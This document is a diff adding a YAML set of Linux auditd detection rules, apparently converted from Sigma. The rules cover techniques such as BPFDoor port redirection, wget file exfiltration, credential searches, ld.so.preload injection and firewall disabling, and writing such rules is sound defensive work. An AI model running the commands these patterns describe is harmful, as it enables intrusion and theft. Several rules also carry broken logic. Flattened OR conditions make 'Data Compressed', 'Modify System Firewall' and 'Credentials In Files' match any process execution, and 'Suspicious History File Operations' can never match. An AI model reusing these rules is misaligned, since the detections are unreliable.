@@ -1,0 +1,6375 @@
+rules:
+- id: lr-sigma-imported-24a870ec
+  title: Bpfdoor TCP Ports Redirect
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: All TCP traffic on particular port from attacker is routed to different
+    port. ex. '/sbin/iptables -t nat -D PREROUTING -p tcp -s 192.168.1.1 --dport 22
+    -j REDIRECT --to-ports 42392' The traffic [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: endswith
+      value: iptables
+    - field: extra.a1
+      op: contains
+      value: -t
+    - field: extra.a2
+      op: contains
+      value: nat
+    condition_logic: and
+  mitre_technique_id: T1562.004
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-f220df3a
+  title: Linux Capabilities Discovery
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects attempts to discover the files with setuid/setgid capability
+    on them. That would allow adversary to escalate their privileges.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains
+      value: getcap
+    - field: extra.a1
+      op: contains
+      value: -r
+    - field: extra.a2
+      op: contains
+      value: /
+    condition_logic: and
+  mitre_technique_id: T1083
+  mitre_tactic: privilege-escalation
+  flag: privilege_escalation
+- id: lr-sigma-imported-ccecd8e1
+  title: File Time Attribute Change - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detect file time attribute change to hide new or changes to existing
+    files.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: raw_message
+      op: contains
+      value: touch
+    - field: raw_message
+      op: contains
+      value: -t
+    - field: raw_message
+      op: contains
+      value: -acmr
+    - field: raw_message
+      op: contains
+      value: -d
+    - field: raw_message
+      op: contains
+      value: -r
+    condition_logic: and
+  mitre_technique_id: T1070.006
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-975b7046
+  title: Remove Immutable File Attribute - Auditd
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects removing immutable file attribute.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains
+      value: chattr
+    - field: extra.a1
+      op: contains
+      value: -i
+    condition_logic: and
+  mitre_technique_id: T1222.002
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-bd84c9d5
+  title: Clipboard Collection with Xclip Tool - Auditd
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects attempts to collect data stored in the clipboard from users
+    with the usage of xclip tool. Xclip has to be installed. Highly recommended using
+    rule on servers, due to high usage of [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains
+      value: xclip
+    - field: extra.a1
+      op: contains_any
+      values:
+      - -selection
+      - -sel
+    - field: extra.a2
+      op: contains_any
+      values:
+      - clipboard
+      - clip
+    - field: extra.a3
+      op: contains
+      value: -o
+    condition_logic: and
+  mitre_technique_id: T1115
+  mitre_tactic: collection
+  flag: data_exfil_candidate
+- id: lr-sigma-imported-1e0c16b5
+  title: Clipboard Collection of Image Data with Xclip Tool
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects attempts to collect image data stored in the clipboard from
+    users with the usage of xclip tool. Xclip has to be installed. Highly recommended
+    using rule on servers, due to high usage of [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains
+      value: xclip
+    - field: extra.a1
+      op: contains_any
+      values:
+      - -selection
+      - -sel
+    - field: extra.a2
+      op: contains_any
+      values:
+      - clipboard
+      - clip
+    - field: extra.a3
+      op: contains
+      value: -t
+    - field: extra.a4
+      op: startswith
+      value: image/
+    - field: extra.a5
+      op: contains
+      value: -o
+    condition_logic: and
+  mitre_technique_id: T1115
+  mitre_tactic: collection
+  flag: data_exfil_candidate
+- id: lr-sigma-imported-16f20bd2
+  title: Possible Coin Miner CPU Priority Param
+  source: sigma
+  log_type: linux_endpoint
+  severity: critical
+  description: Detects command line parameter very often used with coin miners
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.a1
+      op: startswith
+      value: --cpu-priority
+    - field: extra.a2
+      op: startswith
+      value: --cpu-priority
+    - field: extra.a3
+      op: startswith
+      value: --cpu-priority
+    - field: extra.a4
+      op: startswith
+      value: --cpu-priority
+    - field: extra.a5
+      op: startswith
+      value: --cpu-priority
+    - field: extra.a6
+      op: startswith
+      value: --cpu-priority
+    - field: extra.a7
+      op: startswith
+      value: --cpu-priority
+    condition_logic: or
+  mitre_technique_id: T1068
+  mitre_tactic: privilege-escalation
+  flag: privilege_escalation
+- id: lr-sigma-imported-bd3369d5
+  title: Data Compressed
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: An adversary may compress data (e.g., sensitive documents) that is
+    collected prior to exfiltration in order to make it portable and minimize the
+    amount of data sent over the network.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: execve
+    - field: extra.a0
+      op: contains
+      value: zip
+    - field: extra.type
+      op: contains
+      value: execve
+    - field: extra.a0
+      op: contains
+      value: gzip
+    - field: extra.a1
+      op: contains
+      value: -k
+    - field: extra.type
+      op: contains
+      value: execve
+    - field: extra.a0
+      op: contains
+      value: tar
+    - field: extra.a1
+      op: contains
+      value: -c
+    condition_logic: or
+  mitre_technique_id: T1560.001
+  mitre_tactic: collection
+  flag: data_exfil_candidate
+- id: lr-sigma-imported-748fb22d
+  title: Data Exfiltration with Wget
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects attempts to post the file with the usage of wget utility. The
+    adversary can bypass the permission restriction with the misconfigured sudo permission
+    for wget utility which could allow [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains
+      value: wget
+    - field: extra.a1
+      op: startswith
+      value: --post-file=
+    condition_logic: and
+  mitre_technique_id: T1048.003
+  mitre_tactic: exfiltration
+  flag: data_exfil_candidate
+- id: lr-sigma-imported-a47aa746
+  title: Overwriting the File with Dev Zero or Null
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects overwriting (effectively wiping/deleting) of a file.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains
+      value: dd
+    - field: extra.a1
+      op: contains_any
+      values:
+      - if=/dev/null
+      - if=/dev/zero
+    condition_logic: and
+  mitre_technique_id: T1485
+  mitre_tactic: impact
+  flag: suspicious_process
+- id: lr-sigma-imported-b823b6f7
+  title: File or Folder Permissions Change
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects file and folder permission changes.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains_any
+      values:
+      - chmod
+      - chown
+    condition_logic: and
+  mitre_technique_id: T1222.002
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-b365c4ec
+  title: Credentials In Files - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detecting attempts to extract passwords with grep
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    condition_logic: and
+  mitre_technique_id: T1552.001
+  mitre_tactic: credential-access
+  flag: credential_access
+- id: lr-sigma-imported-ba1b5277
+  title: Hidden Files and Directories
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects adversary creating hidden file or directory, by detecting directories
+    or files with . as the first character
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains_any
+      values:
+      - mkdir
+      - nano
+      - touch
+      - vi
+      - vim
+    - field: extra.a1
+      op: re
+      value: (^|\/)\.[^.\/]
+    - field: extra.a2
+      op: re
+      value: (^|\/)\.[^.\/]
+    condition_logic: and
+  mitre_technique_id: T1564.001
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-790194fb
+  title: Steganography Hide Zip Information in Picture File
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects appending of zip file to image
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains
+      value: cat
+    - field: extra.a1
+      op: contains_any
+      values:
+      - .jpg
+      - .png
+    - field: extra.a2
+      op: endswith
+      value: .zip
+    condition_logic: and
+  mitre_technique_id: T1027.003
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-79250352
+  title: Masquerading as Linux Crond Process
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Masquerading occurs when the name or location of an executable, legitimate
+    or malicious, is manipulated or abused for the sake of evading defenses and observation.
+    Several different variations [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: execve
+    - field: extra.a0
+      op: contains
+      value: cp
+    - field: extra.a1
+      op: contains
+      value: /bin/sh
+    - field: extra.a2
+      op: endswith
+      value: /crond
+    condition_logic: and
+  mitre_technique_id: T1036.003
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-ec04ecce
+  title: Modify System Firewall
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects the removal of system firewall rules. Adversaries may only
+    delete or modify a specific system firewall rule to bypass controls limiting network
+    usage or access. Detection rules that [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains
+      value: iptables
+    - field: extra.a1
+      op: contains
+      value: DROP
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains
+      value: firewall-cmd
+    - field: extra.a1
+      op: contains
+      value: remove
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains
+      value: ufw
+    - field: extra.a1
+      op: contains
+      value: delete
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains
+      value: nft
+    - field: extra.a1
+      op: contains_any
+      values:
+      - delete
+      - flush
+    condition_logic: or
+  mitre_technique_id: T1562.004
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-e15d843c
+  title: Network Sniffing - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Network sniffing refers to using the network interface on a system
+    to monitor or capture information sent over a wired or wireless connection. An
+    adversary may place a network interface into [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: execve
+    - field: extra.a0
+      op: contains
+      value: tcpdump
+    - field: extra.a1
+      op: contains
+      value: -c
+    - field: extra.a3
+      op: contains
+      value: -i
+    - field: extra.type
+      op: contains
+      value: execve
+    - field: extra.a0
+      op: contains
+      value: tshark
+    - field: extra.a1
+      op: contains
+      value: -c
+    - field: extra.a3
+      op: contains
+      value: -i
+    condition_logic: or
+  mitre_technique_id: T1040
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-8ca88155
+  title: Screen Capture with Xwd
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects adversary creating screen capture of a full with xwd. Highly
+    recommended using rule on servers, due high usage of screenshot utilities on user
+    workstations
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains
+      value: xwd
+    condition_logic: and
+  mitre_technique_id: T1113
+  mitre_tactic: collection
+  flag: data_exfil_candidate
+- id: lr-sigma-imported-567b7a82
+  title: Steganography Hide Files with Steghide
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects embedding of files with usage of steghide binary, the adversaries
+    may use this technique to prevent the detection of hidden information.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains
+      value: steghide
+    - field: extra.a1
+      op: contains
+      value: embed
+    - field: extra.a2
+      op: contains_any
+      values:
+      - -cf
+      - -ef
+    - field: extra.a4
+      op: contains_any
+      values:
+      - -cf
+      - -ef
+    condition_logic: and
+  mitre_technique_id: T1027.003
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-0c45acc3
+  title: Steganography Extract Files with Steghide
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects extraction of files with usage of steghide binary, the adversaries
+    may use this technique to prevent the detection of hidden information.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains
+      value: steghide
+    - field: extra.a1
+      op: contains
+      value: extract
+    - field: extra.a2
+      op: contains
+      value: -sf
+    - field: extra.a3
+      op: contains_any
+      values:
+      - .jpg
+      - .png
+    condition_logic: and
+  mitre_technique_id: T1027.003
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-0d000435
+  title: Suspicious Commands Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects relevant commands often related to malware or hacking activity
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains
+      value: chmod
+    - field: extra.a1
+      op: contains
+      value: '777'
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains
+      value: chmod
+    - field: extra.a1
+      op: contains
+      value: u+s
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains
+      value: cp
+    - field: extra.a1
+      op: contains
+      value: /bin/ksh
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains
+      value: cp
+    - field: extra.a1
+      op: contains
+      value: /bin/sh
+    condition_logic: or
+  mitre_technique_id: T1059.004
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-3d132354
+  title: Suspicious History File Operations - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects commandline operations on shell history files
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: raw_message
+      op: contains
+      value: .bash_history
+    - field: raw_message
+      op: contains
+      value: .zsh_history
+    - field: raw_message
+      op: contains
+      value: .zhistory
+    - field: raw_message
+      op: contains
+      value: .history
+    - field: raw_message
+      op: contains
+      value: .sh_history
+    - field: raw_message
+      op: contains
+      value: fish_history
+    condition_logic: and
+  mitre_technique_id: T1552.003
+  mitre_tactic: credential-access
+  flag: credential_access
+- id: lr-sigma-imported-da066e56
+  title: Service Reload or Start - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects the start, reload or restart of a service.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains_any
+      values:
+      - systemctl
+      - service
+    - field: extra.a1
+      op: contains_any
+      values:
+      - reload
+      - start
+    condition_logic: and
+  mitre_technique_id: T1543.002
+  mitre_tactic: persistence
+  flag: persistence_mechanism
+- id: lr-sigma-imported-17c03c04
+  title: Steganography Unzip Hidden Information From Picture File
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects extracting of zip file from image file
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains
+      value: unzip
+    - field: extra.a1
+      op: contains_any
+      values:
+      - .jpg
+      - .png
+    condition_logic: and
+  mitre_technique_id: T1027.003
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-d0018a7c
+  title: System Owner or User Discovery - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects the execution of host or user discovery utilities such as "whoami",
+    "hostname", "id", etc. Adversaries may use the information from System Owner/User
+    Discovery during automated discovery [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains_any
+      values:
+      - hostname
+      - id
+      - last
+      - uname
+      - users
+      - w
+      - who
+      - whoami
+    condition_logic: and
+  mitre_technique_id: T1033
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-e63b63b0
+  title: Audio Capture
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects attempts to record audio using the arecord and ecasound utilities.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains
+      value: arecord
+    - field: extra.a1
+      op: contains
+      value: -vv
+    - field: extra.a2
+      op: contains
+      value: -fdat
+    - field: extra.type
+      op: contains
+      value: SYSCALL
+    - field: extra.exe
+      op: endswith
+      value: /ecasound
+    - field: extra.SYSCALL
+      op: contains
+      value: memfd_create
+    condition_logic: or
+  mitre_technique_id: T1123
+  mitre_tactic: collection
+  flag: data_exfil_candidate
+- id: lr-sigma-imported-351eace3
+  title: ASLR Disabled Via Sysctl or Direct Syscall - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: 'Detects actions that disable Address Space Layout Randomization (ASLR)
+    in Linux, including: - Use of the `personality` syscall with the ADDR_NO_RANDOMIZE
+    flag (0x0040000) - Modification of the [...]'
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: SYSCALL
+    - field: extra.SYSCALL
+      op: contains
+      value: personality
+    - field: extra.a0
+      op: contains
+      value: '40000'
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains
+      value: sysctl
+    - field: extra.a1
+      op: contains
+      value: -w
+    - field: extra.a2
+      op: contains
+      value: kernel.randomize_va_space=0
+    condition_logic: or
+  mitre_technique_id: T1562.001
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-e93e0784
+  title: Linux Keylogging with Pam.d
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detect attempt to enable auditing of TTY input
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: PATH
+    - field: extra.name
+      op: contains_any
+      values:
+      - /etc/pam.d/system-auth
+      - /etc/pam.d/password-auth
+    - field: extra.type
+      op: contains_any
+      values:
+      - TTY
+      - USER_TTY
+    condition_logic: or
+  mitre_technique_id: T1003
+  mitre_tactic: credential-access
+  flag: credential_access
+- id: lr-sigma-imported-8b8883b8
+  title: Password Policy Discovery - Linux
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects password policy discovery commands
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: PATH
+    - field: extra.name
+      op: contains_any
+      values:
+      - /etc/login.defs
+      - /etc/pam.d/auth
+      - /etc/pam.d/common-account
+      - /etc/pam.d/common-auth
+      - /etc/pam.d/common-password
+      - /etc/pam.d/system-auth
+      - /etc/security/pwquality.conf
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains
+      value: chage
+    - field: extra.a1
+      op: contains_any
+      values:
+      - --list
+      - -l
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains
+      value: passwd
+    - field: extra.a1
+      op: contains_any
+      values:
+      - -S
+      - --status
+    condition_logic: or
+  mitre_technique_id: T1201
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-887bb94a
+  title: Suspicious C2 Activities
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects suspicious activities as declared by Florian Roth in its 'Best
+    Practice Auditd Configuration'. This includes the detection of the following commands;
+    wget, curl, base64, nc, netcat, [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.key
+      op: contains
+      value: susp_activity
+    condition_logic: and
+  mitre_tactic: command-and-control
+- id: lr-sigma-imported-173b6bf4
+  title: System Information Discovery - Auditd
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects System Information Discovery commands
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: PATH
+    - field: extra.name
+      op: contains_any
+      values:
+      - /etc/lsb-release
+      - /etc/redhat-release
+      - /etc/issue
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains_any
+      values:
+      - uname
+      - uptime
+      - lsmod
+      - hostname
+      - env
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains
+      value: grep
+    - field: extra.a1
+      op: contains_any
+      values:
+      - vbox
+      - vm
+      - xen
+      - virtio
+      - hv
+    - field: extra.type
+      op: contains
+      value: EXECVE
+    - field: extra.a0
+      op: contains
+      value: kmod
+    - field: extra.a1
+      op: contains
+      value: list
+    condition_logic: or
+  mitre_technique_id: T1082
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-5030c659
+  title: Auditing Configuration Changes on Linux Host
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detect changes in auditd configuration files
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: PATH
+    - field: extra.name
+      op: contains_any
+      values:
+      - /etc/audit/*
+      - /etc/libaudit.conf
+      - /etc/audisp/*
+    condition_logic: and
+  mitre_technique_id: T1562.006
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-5d52168b
+  title: BPFDoor Abnormal Process ID or Lock File Accessed
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: detects BPFDoor .lock and .pid files access in temporary file storage
+    facility
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: PATH
+    - field: extra.name
+      op: contains_any
+      values:
+      - /var/run/haldrund.pid
+      - /var/run/xinetd.lock
+      - /var/run/kdevrund.pid
+    condition_logic: and
+  mitre_technique_id: T1106
+  mitre_tactic: execution
+  flag: suspicious_process
+- id: lr-sigma-imported-33853ba3
+  title: Use Of Hidden Paths Or Files
+  source: sigma
+  log_type: linux_endpoint
+  severity: low
+  description: Detects calls to hidden files or files located in hidden directories
+    in NIX systems.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: PATH
+    - field: extra.name
+      op: contains
+      value: /.
+    - field: extra.name
+      op: contains_any
+      values:
+      - /.cache/
+      - /.config/
+      - /.pyenv/
+      - /.rustup/toolchains
+      negate: true
+    condition_logic: and
+  mitre_technique_id: T1574.001
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-45b309a8
+  title: Modification of ld.so.preload
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Identifies modification of ld.so.preload for shared object injection.
+    This technique is used by attackers to load arbitrary code into processes.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: PATH
+    - field: extra.name
+      op: contains
+      value: /etc/ld.so.preload
+    condition_logic: and
+  mitre_technique_id: T1574.006
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-e945b3f7
+  title: Logging Configuration Changes on Linux Host
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detect changes of syslog daemons configuration files
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: PATH
+    - field: extra.name
+      op: contains_any
+      values:
+      - /etc/syslog.conf
+      - /etc/rsyslog.conf
+      - /etc/syslog-ng/syslog-ng.conf
+    condition_logic: and
+  mitre_technique_id: T1562.006
+  mitre_tactic: defense-evasion
+  flag: log_tampering
+- id: lr-sigma-imported-bab29f6d
+  title: Potential Abuse of Linux Magic System Request Key
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects the potential abuse of the Linux Magic SysRq (System Request)
+    key by adversaries with root or sufficient privileges to silently manipulate or
+    destabilize a system. By writing to [...]
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: PATH
+    - field: extra.name
+      op: contains_any
+      values:
+      - /sysrq
+      - /sysctl.conf
+      - /sysrq-trigger
+    condition_logic: and
+  mitre_technique_id: T1059.004
+  mitre_tactic: impact
+  flag: suspicious_process
+- id: lr-sigma-imported-f8d58e76
+  title: System and Hardware Information Discovery
+  source: sigma
+  log_type: linux_endpoint
+  severity: informational
+  description: Detects system information discovery commands
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: PATH
+    - field: extra.name
+      op: contains_any
+      values:
+      - /sys/class/dmi/id/bios_version
+      - /sys/class/dmi/id/product_name
+      - /sys/class/dmi/id/chassis_vendor
+      - /proc/scsi/scsi
+      - /proc/ide/hd0/model
+      - /proc/version
+      - /etc/*version
+      - /etc/*release
+      - /etc/issue
+    condition_logic: and
+  mitre_technique_id: T1082
+  mitre_tactic: discovery
+  flag: recon_candidate
+- id: lr-sigma-imported-b7d06730
+  title: Systemd Service Creation
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detects a creation of systemd services which could be used by adversaries
+    to execute malicious code.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: PATH
+    - field: extra.nametype
+      op: contains
+      value: CREATE
+    condition_logic: and
+  mitre_technique_id: T1543.002
+  mitre_tactic: persistence
+  flag: persistence_mechanism
+- id: lr-sigma-imported-c004efcc
+  title: Unix Shell Configuration Modification
+  source: sigma
+  log_type: linux_endpoint
+  severity: medium
+  description: Detect unix shell configuration modification. Adversaries may establish
+    persistence through executing malicious commands triggered when a new shell is
+    opened.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: PATH
+    - field: extra.name
+      op: contains_any
+      values:
+      - /etc/shells
+      - /etc/profile
+      - /etc/profile.d/*
+      - /etc/bash.bashrc
+      - /etc/bashrc
+      - /etc/zsh/zprofile
+      - /etc/zsh/zshrc
+      - /etc/zsh/zlogin
+      - /etc/zsh/zlogout
+      - /etc/csh.cshrc
+      - /etc/csh.login
+      - /root/.bashrc
+      - /root/.bash_profile
+      - /root/.profile
+      - /root/.zshrc
+      - /root/.zprofile
+      - /home/*/.bashrc
+      - /home/*/.zshrc
+      - /home/*/.bash_profile
+      - /home/*/.zprofile
+      - /home/*/.profile
+      - /home/*/.bash_login
+      - /home/*/.bash_logout
+      - /home/*/.zlogin
+      - /home/*/.zlogout
+    condition_logic: and
+  mitre_technique_id: T1546.004
+  mitre_tactic: persistence
+  flag: persistence_mechanism
+- id: lr-sigma-imported-929b81f8
+  title: Disable System Firewall
+  source: sigma
+  log_type: linux_endpoint
+  severity: high
+  description: Detects disabling of system firewalls which could be used by adversaries
+    to bypass controls that limit usage of the network.
+  enabled: true
+  requires_sysmon: false
+  match:
+    type: simple
+    log_type: linux_endpoint
+    conditions:
+    - field: extra.type
+      op: contains
+      value: SERVICE_STOP
+    - field: extra.unit
+      op: contains_any
+      values:
+      - firewalld
+      - iptables
+      - ufw
+    condition_logic: and
+  mitre_technique_id: T1562.004
+  mitre_tactic: defense-evasion
+  flag: log_tampering
